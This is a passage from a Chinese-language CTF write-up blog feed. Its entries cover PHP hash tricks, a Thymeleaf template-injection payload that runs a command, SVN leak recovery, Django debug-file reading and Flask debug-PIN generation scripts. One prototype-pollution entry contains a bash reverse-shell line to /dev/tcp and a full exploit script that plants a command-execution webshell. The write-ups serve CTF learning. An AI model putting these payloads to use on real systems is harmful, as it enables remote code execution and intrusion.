isset($_POST[$key3])) &#123;</span><br><span class="line">    $user = $_POST[$key2];</span><br><span class="line">    $pass = $_POST[$key3];</span><br><span class="line"></span><br><span class="line">    if (strlen($user) &gt; 4 || strlen($pass) &gt; 5) &#123;</span><br><span class="line">          die(&quot;还得练&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">     if ($user !== $pass &amp;&amp; md5($user) === md5($pass)) &#123;  </span><br><span class="line">          echo &quot;还不错哦&quot;.&quot;$flag&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">          die(&quot;nonono&quot;) ;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>7.直接讲第二关：</p><ul><li>检查GET请求中是否包含参数<code>$key1</code>。</li><li>获取参数<code>$key1</code>的值并检查其MD4哈希值是否等于自身。</li><li>如果匹配，输出提示信息和<code>$key2</code>、<code>$key3</code>；否则，输出错误信息并终止脚本执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M[ore.8=0e001233333333333334557778889</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-Arjun是什么？&quot;&gt;&lt;a href=&quot;#1-Arjun是什么？&quot; class=&quot;headerlink&quot; title=&quot;1.Arjun是什么？&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.Arjun是什么？&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Arjun 可以查找 URL 端点</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>springbootThymeleaf模板注入</title>
    <link href="http://1768161086.github,io/2025/04/01/springbootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>http://1768161086.github,io/2025/04/01/springbootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2025-04-01T12:14:10.000Z</published>
    <updated>2025-04-01T12:16:37.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2024御网杯-admin"><a href="#2024御网杯-admin" class="headerlink" title="2024御网杯_admin"></a>2024御网杯_admin</h2><p>1.扫目录发现两个目录，admin和login</p><p>2.根据报错页面发现是<a href="https://www.freebuf.com/articles/network/250026.html">springboot Thymeleaf 模板注入</a></p><p>3.找到一篇文章写的很好，利用文章给出的payload打，注意需要在admin目录请求且需要对特殊字符url编码下</p><p>4.payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.200.58.4:3333//admin/?path=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2024御网杯-admin&quot;&gt;&lt;a href=&quot;#2024御网杯-admin&quot; class=&quot;headerlink&quot; title=&quot;2024御网杯_admin&quot;&gt;&lt;/a&gt;2024御网杯_admin&lt;/h2&gt;&lt;p&gt;1.扫目录发现两个目录，admin和login&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>svn泄露</title>
    <link href="http://1768161086.github,io/2025/04/01/svn%E6%B3%84%E9%9C%B2/"/>
    <id>http://1768161086.github,io/2025/04/01/svn%E6%B3%84%E9%9C%B2/</id>
    <published>2025-04-01T11:50:49.000Z</published>
    <updated>2025-04-01T12:13:10.077Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2024御网杯-input-data"><a href="#2024御网杯-input-data" class="headerlink" title="2024御网杯_input_data"></a>2024御网杯_input_data</h2><p>1.<a href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020">svn</a>泄露，使用SVN泄露的漏洞利用工具dvcs-ripper即可恢复flag文件</p><p>2.安装dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>3.工具使用perl语言，需要<a href="https://so.csdn.net/so/search?q=%E5%AE%89%E8%A3%85perl&spm=1001.2101.3001.7020">安装perl</a>环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure><p>4.进入dvcs-ripper目录,使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -u http://xxx/.svn</span><br></pre></td></tr></table></figure><p>5.cat flag即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2024御网杯-input-data&quot;&gt;&lt;a href=&quot;#2024御网杯-input-data&quot; class=&quot;headerlink&quot; title=&quot;2024御网杯_input_data&quot;&gt;&lt;/a&gt;2024御网杯_input_data&lt;/h2&gt;&lt;p&gt;1.&lt;a h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>javascript原型链污染</title>
    <link href="http://1768161086.github,io/2025/03/31/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://1768161086.github,io/2025/03/31/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2025-03-31T10:09:27.000Z</published>
    <updated>2025-05-23T13:25:27.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-wife-wife"><a href="#攻防世界-wife-wife" class="headerlink" title="攻防世界_wife_wife"></a>攻防世界_wife_wife</h2><p>1.由于使用了assign()，因此存在Javascript原型链污染的漏洞。</p><p>2.进入就是一个登陆界面，尝试sql注入，用御剑扫描，都没有新发现。</p><p>3.注册页面，有一个<code>is admin</code>选项，想要得到正确的flag必须注册admin的账号</p><p>4.当勾选<code>is admin</code>时，必须填入邀请码，否则无法注册</p><p>5.Javascript原型链污染,利用该漏洞的前提是后端使用<strong>Node.js</strong>语言,使用wappalyzer</p><p>6.在注册时输入错误的邀请码，返回如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;2&quot;,&quot;isAdmin&quot;:true,&quot;inviteCode&quot;:&quot;123&quot;&#125;</span><br><span class="line">返回：invalid</span><br></pre></td></tr></table></figure><p>7.在请求报文中，可以看到有isAdmin参数，使用Javascript原型链污染，更改请求报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;2&quot;,</span><br><span class="line">&quot;__proto__&quot;:&#123;</span><br><span class="line">&quot;isAdmin&quot;:true&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8.管理员用户创建成功，使用该用户登录即可拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0CatCTF&#123;test_flag_hw_c@n_I_l1ve_w1th0ut_nilou&#125;</span><br></pre></td></tr></table></figure><h2 id="Newctf2024-ezpollute"><a href="#Newctf2024-ezpollute" class="headerlink" title="Newctf2024-ezpollute"></a>Newctf2024-ezpollute</h2><p>根据题目名称可知，这是一道 JavaScript 的原型链污染题</p><p>1.查看部署文件，可以得知 Node.js 版本为 16，并且使用了 <code>node-dev</code> 热部署启动</p><p>2.审计 <code>index.js</code>，<code>/config</code> 路由下调用了 <code>merge</code> 函数，<code>merge</code> 函数意味着可能存在的原型链污染漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">router.post(&quot;/config&quot;, async (ctx) =&gt; &#123;</span><br><span class="line">  jsonData = ctx.request.rawBody || &quot;&#123;&#125;&quot;;</span><br><span class="line">  token = ctx.cookies.get(&quot;token&quot;);</span><br><span class="line">  if (!token) &#123;</span><br><span class="line">    return (ctx.body = &#123;</span><br><span class="line">      code: 0,</span><br><span class="line">      msg: &quot;Upload Photo First&quot;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  const [err, userID] = decodeToken(token);</span><br><span class="line">  if (err) &#123;</span><br><span class="line">    return (ctx.body = &#123;</span><br><span class="line">      code: 0,</span><br><span class="line">      msg: &quot;Invalid Token&quot;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  userConfig = JSON.parse(jsonData);</span><br><span class="line">  try &#123;</span><br><span class="line">    finalConfig = clone(defaultWaterMarkConfig);</span><br><span class="line">    // 这里喵</span><br><span class="line">    merge(finalConfig, userConfig);</span><br><span class="line">    fs.writeFileSync(path.join(__dirname, &quot;uploads&quot;, userID, &quot;config.json&quot;), JSON.stringify(finalConfig));</span><br><span class="line">    ctx.body = &#123;</span><br><span class="line">      code: 1,</span><br><span class="line">      msg: &quot;Config updated successfully&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    ctx.body = &#123;</span><br><span class="line">      code: 0,</span><br><span class="line">      msg: &quot;Some error occurred&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3.<code>merge</code> 函数在 <code>/util/merge.js</code> 中，虽然过滤了 <code>proto</code>，但我们可以通过 <code>constructor.prototype</code> 来绕过限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// /util/merge.js</span><br><span class="line">function merge(target, source) &#123;</span><br><span class="line">  if (!isObject(target) || !isObject(source)) &#123;</span><br><span class="line">    return target;</span><br><span class="line">  &#125;</span><br><span class="line">  for (let key in source) &#123;</span><br><span class="line">    if (key === &quot;__proto__&quot;) continue;</span><br><span class="line">    if (source[key] === &quot;&quot;) continue;</span><br><span class="line">    if (isObject(source[key]) &amp;&amp; key in target) &#123;</span><br><span class="line">      target[key] = merge(target[key], source[key]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      target[key] = source[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.<code>/process</code> 路由调用了 <code>fork</code>，创建了一个 JavaScript 子进程用于水印添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  await new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    // 这里喵</span><br><span class="line">    const proc = fork(PhotoProcessScript, [userDir], &#123; silent: true &#125;);</span><br><span class="line"></span><br><span class="line">    proc.on(&quot;close&quot;, (code) =&gt; &#123;</span><br><span class="line">      if (code === 0) &#123;</span><br><span class="line">        resolve(&quot;success&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        reject(new Error(&quot;An error occurred during execution&quot;));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    proc.on(&quot;error&quot;, (err) =&gt; &#123;</span><br><span class="line">      reject(new Error(`Failed to start subprocess: $&#123;err.message&#125;`));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  ctx.body = &#123;</span><br><span class="line">    code: 1,</span><br><span class="line">    msg: &quot;Photos processed successfully&quot;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125; catch (error) &#123;</span><br><span class="line">  ctx.body = &#123;</span><br><span class="line">    code: 0,</span><br><span class="line">    msg: &quot;some error occurred&quot;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.结合之前的原型链污染漏洞，我们污染 <code>NODE_OPTIONS</code> 和 <code>env</code>，在 <code>env</code> 中写入恶意代码，<code>fork</code> 在创建子进程时就会首先加载恶意代码，从而实现 RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;constructor&quot;: &#123;</span><br><span class="line">        &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;,</span><br><span class="line">            &quot;env&quot;: &#123;</span><br><span class="line">                 &quot;A&quot;:&quot;require(\&quot;child_process\&quot;).execSync(\&quot;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&#x27;\&quot;)//&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 需要注意在 Payload 最后面有注释符 `//`，这里的思路跟 SQL 注入很像</span><br></pre></td></tr></table></figure><p>考虑到新生可能没有云服务器来反弹 shell，因此在赛题设计时选择了热部署启动</p><p>除了弹 shell，还可以通过写 WebShell 覆盖 <code>index.js</code>，从而实现有回显 RCE，或者把 flag 输出到 <code>static</code> 目录下读也可以</p><p>比赛时题目环境并没有出网，弹不了 shell，只能通过后两种方式来做，这里给出写 WebShell 的做法</p><blockquote><p>热部署</p><p>就是在应用正在运行的时候升级软件，却不需要重新启动应用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url = &quot;http://url:port&quot;</span><br><span class="line"></span><br><span class="line"># 获取 token</span><br><span class="line"># 随便发送点图片获取 token</span><br><span class="line">files = [</span><br><span class="line">    (&#x27;images&#x27;, (&#x27;anno.png&#x27;, open(&#x27;./1.png&#x27;, &#x27;rb&#x27;), &#x27;image/png&#x27;)),</span><br><span class="line">    (&#x27;images&#x27;, (&#x27;soyo.png&#x27;, open(&#x27;./2.png&#x27;, &#x27;rb&#x27;), &#x27;image/png&#x27;))</span><br><span class="line">]</span><br><span class="line">res = requests.post(url + &quot;/upload&quot;, files=files)</span><br><span class="line">token = res.headers.get(&#x27;Set-Cookie&#x27;)</span><br><span class="line">match = re.search(r&#x27;token=([a-f0-9\-\.]+)&#x27;, token)</span><br><span class="line">if match:</span><br><span class="line">    token = match.group(1)</span><br><span class="line">    print(f&quot;[+] token: &#123;token&#125;&quot;)</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Cookie&#x27;: f&#x27;token=&#123;token&#125;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 通过原型链污染 env 注入恶意代码即可 RCE</span><br><span class="line"></span><br><span class="line"># 写入 WebShell</span><br><span class="line">webshell = &quot;&quot;&quot;</span><br><span class="line">const Koa = require(&#x27;koa&#x27;)</span><br><span class="line">const Router = require(&#x27;koa-router&#x27;)</span><br><span class="line">const app = new Koa()</span><br><span class="line">const router = new Router()</span><br><span class="line"></span><br><span class="line">router.get(&quot;/webshell&quot;, async (ctx) =&gt; &#123;</span><br><span class="line">    const &#123;cmd&#125; = ctx.query</span><br><span class="line">    res = require(&#x27;child_process&#x27;).execSync(cmd).toString()</span><br><span class="line">    return ctx.body = &#123;</span><br><span class="line">        res</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(router.routes())</span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;http://127.0.0.1:3000&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 将 WebShell 内容 Base64 编码</span><br><span class="line">encoded_webshell = base64.b64encode(webshell.encode()).decode()</span><br><span class="line"></span><br><span class="line"># Base64 解码后写入文件</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;constructor&quot;: &#123;</span><br><span class="line">        &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;,</span><br><span class="line">            &quot;env&quot;: &#123;</span><br><span class="line">                &quot;A&quot;: f&quot;require(\&quot;child_process\&quot;).execSync(\&quot;echo &#123;encoded_webshell&#125; | base64 -d &gt; /app/index.js\&quot;)//&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 原型链污染</span><br><span class="line">requests.post(url + &quot;/config&quot;, json=payload, headers=headers)</span><br><span class="line"></span><br><span class="line"># 触发 fork 实现 RCE</span><br><span class="line">try:</span><br><span class="line">    requests.post(url + &quot;/process&quot;, headers=headers)</span><br><span class="line">except Exception as e:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">sleep(2)</span><br><span class="line"># 访问有回显的 WebShell</span><br><span class="line">res = requests.get(url + &quot;/webshell?cmd=cat /flag&quot;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;攻防世界-wife-wife&quot;&gt;&lt;a href=&quot;#攻防世界-wife-wife&quot; class=&quot;headerlink&quot; title=&quot;攻防世界_wife_wife&quot;&gt;&lt;/a&gt;攻防世界_wife_wife&lt;/h2&gt;&lt;p&gt;1.由于使用了assign()，因此存在Ja</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python_django</title>
    <link href="http://1768161086.github,io/2025/03/30/python-django/"/>
    <id>http://1768161086.github,io/2025/03/30/python-django/</id>
    <published>2025-03-30T06:25:39.000Z</published>
    <updated>2025-03-30T06:45:09.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-Cat"><a href="#攻防世界-Cat" class="headerlink" title="攻防世界-Cat"></a>攻防世界-Cat</h2><p>打开发现url输入框</p><p>1.sqlfuzz测试</p><p>2.爆破发现%df和%a0长度较大</p><p>3.查看发现了Django</p><p>4. 既然是django文件还有前端代码，复制后用游览器打开试试</p><p>5.用游览器打开以后最底下可以看到一串提示：You’re seeing this error because you have DEBUG &#x3D; True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code.</p><p>6.直接所有settings，会发现很多，但是比较特殊的有这个（和settings和database有关，百度搜索）</p><p>7.对应的路径：&#x2F;opt&#x2F;api&#x2F;database.sqlite3</p><p>8.最终的payload：@&#x2F;opt&#x2F;api&#x2F;database.sqlite3</p><p>9.搜索关键字ctf发现flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;攻防世界-Cat&quot;&gt;&lt;a href=&quot;#攻防世界-Cat&quot; class=&quot;headerlink&quot; title=&quot;攻防世界-Cat&quot;&gt;&lt;/a&gt;攻防世界-Cat&lt;/h2&gt;&lt;p&gt;打开发现url输入框&lt;/p&gt;
&lt;p&gt;1.sqlfuzz测试&lt;/p&gt;
&lt;p&gt;2.爆破发现%df</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>flask_pin</title>
    <link href="http://1768161086.github,io/2025/03/29/flask-pin/"/>
    <id>http://1768161086.github,io/2025/03/29/flask-pin/</id>
    <published>2025-03-29T03:01:51.000Z</published>
    <updated>2025-03-29T03:23:29.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flask-pin"><a href="#flask-pin" class="headerlink" title="flask_pin"></a>flask_pin</h1><h2 id="1-什么是pin码"><a href="#1-什么是pin码" class="headerlink" title="1.什么是pin码"></a><strong>1.什么是pin码</strong></h2><p>pin码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式。</p><h2 id="2-PIN生成要素"><a href="#2-PIN生成要素" class="headerlink" title="2.PIN生成要素"></a>2.<strong>PIN生成要素</strong></h2><ul><li>username，用户名</li><li>modname，默认值为flask.app</li><li>appname，默认值为Flask</li><li>moddir，flask库下app.py的绝对路径</li><li>uuidnode，当前网络的mac地址的十进制数</li><li>machine_id，docker机器id</li></ul><p><strong>username</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getpass.getuser()读取，通过文件读取/etc/passwd</span><br></pre></td></tr></table></figure><p><strong>modname</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getattr(mod,“file”,None)读取，默认值为flask.app</span><br></pre></td></tr></table></figure><p><strong>appname</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getattr(app,“name”,type(app).name)读取，默认值为Flask</span><br></pre></td></tr></table></figure><p><strong>moddir</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取</span><br></pre></td></tr></table></figure><p><strong>uuidnode</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算</span><br></pre></td></tr></table></figure><p><strong>machine_id</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id，docker靶机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</span><br><span class="line">/etc/machine-id</span><br><span class="line">/proc/sys/kernel/random/boot_id</span><br><span class="line">/proc/self/cgroup</span><br></pre></td></tr></table></figure><h2 id="3-上面的pin元素能干嘛呢"><a href="#3-上面的pin元素能干嘛呢" class="headerlink" title="3.上面的pin元素能干嘛呢"></a>3.<strong>上面的pin元素能干嘛呢</strong></h2><p>生成pin码的脚本如下：</p><p>pytho3.5版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;,# username</span><br><span class="line">    &#x27;flask.app&#x27;,# modname</span><br><span class="line">    &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">    &#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377892354&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">    &#x27;32e48d371198e8420c53b0a1fa37e94d&#x27;# get_machine_id(), /etc/machine-id+/proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>官方是通过系统命令获取相对应的值，我们采用读文件获取值后放到脚本(也就是官方加密的方法)里进行加密，3.6采用MD5加密，3.8采用sha1加密，所以脚本稍有不同</p><p>python3.6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 